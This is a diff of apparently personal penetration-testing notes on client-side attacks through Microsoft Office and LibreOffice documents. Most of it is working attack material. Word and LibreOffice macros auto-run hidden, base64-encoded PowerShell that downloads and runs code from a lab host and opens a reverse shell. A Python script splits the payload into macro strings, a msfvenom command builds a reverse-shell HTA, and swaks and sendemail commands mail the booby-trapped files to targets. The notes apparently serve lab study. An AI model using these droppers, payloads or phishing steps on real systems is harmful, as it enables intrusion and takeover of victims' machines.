@@ -6,7 +6,18 @@
   
   ``` exiftool -a -u xxx.pdf ```
 
+# Useful splitter
+- Splitter.py 
+    ```
+        s = "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoA7AA=="
+        n = 50
+        for i in range(0, len(s), n):
+            chunk = s[i:i + n]
+            print('Str = Str + "' + chunk + '"')
+    ```
+
 # Exploit Microsoft Office
+
 ## Macro Abuse
 - With old .doc file
 - macro func must enabled
@@ -24,29 +35,29 @@
     ```
 
 - Macro example: 
-``` 
-Sub AutoOpen()
-    MyMacro
-End Sub
+    ``` 
+        Sub AutoOpen()
+            MyMacro
+        End Sub
 
-Sub Document_Open()
-    MyMacro
-End Sub
+        Sub Document_Open()
+            MyMacro
+        End Sub
 
-Sub MyMacro()
-    Dim Str As String
-    
-    Str = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU"
-        Str = Str + "AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd"
-        Str = Str + "AAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwB"
-    ...
-        Str = Str + "QBjACAAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAgAC0AcAA"
-        Str = Str + "gADQANAA0ADQAIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsA"
-        Str = Str + "A== "
+        Sub MyMacro()
+            Dim Str As String
+            
+            Str = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU"
+                Str = Str + "AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd"
+                Str = Str + "AAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwB"
+            ...
+                Str = Str + "QBjACAAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAgAC0AcAA"
+                Str = Str + "gADQANAA0ADQAIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsA"
+                Str = Str + "A== "
 
-    CreateObject("Wscript.Shell").Run Str
-End Sub
-``` 
+            CreateObject("Wscript.Shell").Run Str
+        End Sub
+    ``` 
 
 - useful post-exploit file transfer: https://ironhackers.es/en/cheatsheet/transferir-archivos-post-explotacion-cheatsheet/ 
 
@@ -94,3 +105,31 @@ End Sub
 Send email with given information e.g. receiver/sender, smtp server usrname pw
 - SWAKS
   ``` sudo swaks -t dave.wizard@supermagicorg.com --from test@supermagicorg.com -ap --attach @config.Library-ms --server 192.168.151.199 --body body.txt --header "Subject: Problems" --suppress-data ```
+- sendemail
+    ``` sendemail -f 'jonas@localhost' \
+        -t 'mailadmin@localhost' \
+        -s 192.168.244.140:25 \
+        -u 'a spreadsheet' \
+        -m 'Please check this spreadsheet' \
+        -a exploit.ods 
+    ```
+
+
+## Exploit Libre Office
+1. Prepare payload ``` msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.241 LPORT=4444 -f hta-psh -o evil.hta ```
+2. Split the file
+3. open new .ods file and add macro under the file
+   ```
+    Sub Macro 
+    Dim Str as String
+    Str = Str + "cmd /c powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU"
+    Str = Str + "AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd"
+    Str = Str + "AAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwB"
+...
+    Str = Str + "QBjACAAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAgAC0AcAA"
+    Str = Str + "gADQANAA0ADQAIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsA"
+    Str = Str + "A== "
+    Shell(Str)
+
+   ```
+4. Enable auto-run once this excel is open: Tools → Customize
